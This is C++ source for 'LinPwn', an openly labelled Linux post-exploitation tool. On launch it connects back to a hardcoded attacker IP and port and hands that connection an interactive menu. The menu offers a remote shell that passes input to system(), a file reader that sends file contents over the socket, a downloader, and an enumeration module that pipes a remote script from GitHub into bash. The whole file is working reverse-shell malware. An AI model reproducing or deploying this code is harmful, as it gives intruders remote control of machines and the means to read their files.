/* LinPwn
   
   Interactive Post Exploitation Tool  

   Copyright (C) 2019  Andromeda3(3XPL017)

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program. If not, see <https://www.gnu.org/licenses/>.
*/

#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <csignal>
#include <ctime>
#include <chrono>//NOLINT
#include <string>

#define BUFFER 200

int sd() {
  return 0;
}

void get_input(char *option) {
  fgets(option, BUFFER, stdin);

  for (unsigned int i = 0; i <= strnlen(option, BUFFER); i++) {
    if (option[i] == '\n') {
      option[i] = '\0';
    }
  }
}

void new_line() {
  std::string newline = "\n";
  write(sd(), newline.data(), newline.length());
}

void seperate() {
  std::string seperator = "====================================="
      "======================================\n";
  write(sd(), seperator.data(), seperator.length());
}

void space() {
  std::string space = " ";
  write(sd(), space.data(), space.length());
}

void green() {
  std::string green = "\x1b[32m ";
  write(sd(), green.data(), green.length());
}

void none() {
  std::string none = "none\n";
  write(sd(), none.data(), none.length());
}

void help_menu() {
  std::string options = "\x1b[32mOptions \n";
  std::string banner = "banner - displays the banner.\n";
  std::string modules = "modules - lists modules.\n";
  std::string clear = "clear - clears the screen.\n";
  std::string exits = "exit - or press ^C to quit LinPwn.\n";
  new_line();
  write(sd(), options.data(), options.length());
  seperate();
  write(sd(), banner.data(), banner.length());
  write(sd(), modules.data(), modules.length());
  write(sd(), clear.data(), clear.length());
  write(sd(), exits.data(), exits.length());
  new_line();
}

class Banner {
 public:
  void print_banner() {
    get_banner();
    get_time();
    get_sysinfo();
    get_ip();
    get_user();
    get_uid();
    get_pwd();
    get_home();
    get_shell();
    get_term();
    get_path();
    new_line();
  }

 private:
  void get_banner() {
    std::string title = "\x1b[32mLinPwn\nCreated By Andromeda.\n";
    write(sd(), title.data(), title.length());
    new_line();
  }

  void get_time() {
    std::string print_time = "Time: ";
    write(sd(), print_time.data(), print_time.length());
    auto end = std::chrono::system_clock::now();
    std::time_t end_time = std::chrono::system_clock::to_time_t(end);
    std::string current_time = std::ctime(&end_time);
    write(sd(), current_time.data(), current_time.length());
  }

  void get_sysinfo() {
    struct utsname utsinfo;
    uname(&utsinfo);
    std::string sysname = utsinfo.sysname;
    std::string nodename = utsinfo.nodename;
    std::string release = utsinfo.release;
    std::string version = utsinfo.version;
    std::string machine = utsinfo.machine;
    std::string domainname = utsinfo.domainname;
    std::string systems = "System: ";
    write(sd(), systems.data(), systems.length());
    write(sd(), sysname.data(), sysname.length());
    space();
    write(sd(), nodename.data(), nodename.length());
    space();
    write(sd(), release.data(), release.length());
    space();
    write(sd(), version.data(), version.length());
    space();
    write(sd(), machine.data(), machine.length());
    space();
    write(sd(), domainname.data(), domainname.length());
    new_line();
  }

  void get_ip() {
    std::string ip = "IP: ";
    write(sd(), ip.data(), ip.length());
    system("hostname -I");
  }

  void get_user() {
    std::string env = "User: ";
    std::string username = getenv("USER");
    write(sd(), env.data(), env.length());

    if (!getenv("USER")) {
      none();
      return;
    }

    write(sd(), username.data(), username.length());
    new_line();
  }

  void get_uid() {
    int uid = getuid();
    std::string env = "UID: ";
    std::string uidstr = std::to_string(uid);
    write(sd(), env.data(), env.length());
    write(sd(), uidstr.data(), uidstr.length());
    new_line();
  }

  void get_pwd() {
    std::string env = "Pwd: ";
    std::string pwd = getenv("PWD");
    write(sd(), env.data(), env.length());

    if (!getenv("PWD")) {
      none();
      return;
    }

    write(sd(), pwd.data(), pwd.length());
    new_line();
  }

  void get_home() {
    std::string env = "Home: ";
    std::string home = getenv("HOME");
    write(sd(), env.data(), env.length());

    if (!getenv("HOME")) {
      none();
      return;
    }

    write(sd(), home.data(), home.length());
    new_line();
  }

  void get_shell() {
    std::string env = "Shell: ";
    std::string shell = getenv("SHELL");
    write(sd(), env.data(), env.length());

    if (!getenv("SHELL")) {
      none();
      return;
    }

    write(sd(), shell.data(), shell.length());
    new_line();
  }

  void get_term() {
    std::string env = "Term: ";
    std::string term = getenv("TERM");
    write(sd(), env.data(), env.length());

    if (!getenv("TERM")) {
      none();
      return;
    }

    write(sd(), term.data(), term.length());
    new_line();
  }

  void get_path() {
    std::string env = "Path: ";
    std::string path = getenv("PATH");
    write(sd(), env.data(), env.length());

    if (!getenv("PATH")) {
      none();
      return;
    }

    write(sd(), path.data(), path.length());
    new_line();
  }
};

class Connection {
 public:
  void connection_open() {
    const int connecting = socket(AF_INET, SOCK_STREAM, 0);;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip);
    address.sin_port = htons(port);
    connect(connecting, (struct sockaddr *)&address, sizeof(address));
    dup2(connecting, sd());
    dup2(connecting, 1);
  }

 private:
  const char *ip = "192.168.1.165";  // Change this
  const int port = 8000;  // Change this
  struct sockaddr_in address;
};

class Modules {
 public:
  void list_modules() {
    std::string modules = "\x1b[32mModules \n";
    std::string shell = "shell - Executes /bin/sh\n";
    std::string read_file = "readfile - Print the contents of a file\n";
    std::string enumerate = "enumerate - Download and run LinEnum "
      "(requires internet access)\n";
    std::string download = "download - Downloads a file\n";

    new_line();
    write(sd(), modules.data(), modules.length());
    seperate();
    write(sd(), shell.data(), shell.length());
    write(sd(), read_file.data(), read_file.length());
    write(sd(), enumerate.data(), enumerate.length());
    write(sd(), download.data(), download.length());
    new_line();
  }

  void shell() {
    std::string shell = "\x1b[31m(LinPwn: Shell) >";
    std::string exe = "\x1b[32mExecuting /bin/sh\n";
    std::string exits = "Type exit to return to LinPwn.\n";
    char option[BUFFER];
    const char *errors = " 2>&0";
    write(sd(), exe.data(), exe.length());
    write(sd(), exits.data(), exits.length());

    for (;;) {
      write(sd(), shell.data(), shell.length());
      green();
      get_input(option);

      if (strncmp(option, "exit\0", 5) == 0) {
        break;
      } else {
        strncat(option, errors, BUFFER);
        system(option);
      }
    }
  }

  void read_file() {
    std::string contents = "\x1b[32mType full path of file"
      "to view contents...\n";
    std::string read = "\x1b[31m(LinPwn: Readfile) >";
    std::string exits = "Type exit to return to LinPwn.\n";
    char option[BUFFER];

    write(sd(), contents.data(), contents.length());
    write(sd(), exits.data(), exits.length());

    for (;;) {
      write(sd(), read.data(), read.length());
      green();
      get_input(option);

      if (strncmp(option, "exit\0", 5) == 0) {
        break;
      } else {
        open_file(option);
      }
    }
  }

  void enumeration() {
    std::string error0 = "\x1b[33mIf LinEnum didnt run curl"
      " or wget may not be installed\n";
    std::string error1 = "or you do not have internet access\n";
    const char *curl = "curl https://raw.githubusercontent.com/"
      "rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null | bash  2>/dev/null";
    const char *wget = "wget -O - https://raw.githubusercontent.com/"
      "rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null | bash  2>/dev/null";

    if (check_curl) {
      system(curl);
      return;
    } else if (check_wget) {
      system(wget);
      return;
    }

    write(sd(), error0.data(), error0.length());
    write(sd(), error1.data(), error1.length());
    return;
  }

  void download() {
    std::string url = "\x1b[32mEnter the URL of the target "
      "file to download it\n";
    std::string downloads = "\x1b[31m(LinPwn: Download) >";
    std::string curl_error = "\x1b[33mCurl or Wget is not installed\n";
    char *command = new char[BUFFER];
    const char *curl = "curl ";
    const char *wget = "wget ";
    const char *errors = " 2>/dev/null";
    char option[BUFFER];

    if (check_curl) {
      strncat(command, curl, BUFFER);
    } else if (check_wget) {
      strncat(command, wget, BUFFER);
    } else {
      write(sd(), curl_error.data(), curl_error.length());
      return;
    }

    write(sd(), url.data(), url.length());
    write(sd(), downloads.data(), downloads.length());
    green();
    get_input(option);
    strncat(command, option, BUFFER);
    strncat(command, errors, BUFFER);
    system(command);
    delete[] command;
  }

 private:
  std::string error = "\x1b[33m Cannot open file.\n";
  FILE *check_curl = fopen("/usr/bin/curl", "rb");
  FILE *check_wget = fopen("/usr/bin/wget", "rb");

  void open_file(char *option) {
    FILE *file = fopen(option, "rb");

    if (!file) {
      write(sd(), error.data(), error.length());
      return;
    }

    fseek(file, 0, SEEK_END);
    int size = ftell(file);
    fseek(file, 0, SEEK_SET);
    char *filecontent = new char[size];

    fread(filecontent, 1, size, file);
    filecontent[size] = '\0';
    send(sd(), filecontent, size, 0);
    fclose(file);
    delete[] filecontent;
  }
};

int handler() {
  Banner ban;
  Modules modules;
  std::string not_valid = "\x1b[33mNot a valid option\n";
  char *option = new char[BUFFER];
  get_input(option);
  std::string shell = "shell";
  std::string read = "readfile";
  std::string enumerate = "enumerate";
  std::string module_list = "modules";
  std::string download = "download";
  std::string quit = "exit";
  std::string clear = "clear";
  std::string help ="help";
  std::string banner = "banner";
  std::string nothing = "";

  if (option == shell)
    modules.shell();
  else if (option == read)
    modules.read_file();
  else if (option == enumerate)
    modules.enumeration();
  else if (option == module_list)
    modules.list_modules();
  else if (option == download)
    modules.download();
  else if (option == quit)
    return 1;
  else if (option == clear)
    system("clear");
  else if (option == help)
    help_menu();
  else if (option == banner)
    ban.print_banner();
  else if (option == nothing)
    return 0;
  else
    write(sd(), not_valid.data(), not_valid.length());

  delete[] option;
  return 0;
}

void main_loop() {
  std::string linpwn = "\x1b[31m(LinPwn) >";

  do {
    write(sd(), linpwn.data(), linpwn.length());
    green();
  } while (handler() != 1);
}

int main() {
  Banner ban;
  Connection connection;
  connection.connection_open();
  ban.print_banner();
  main_loop();
  return 0;
}
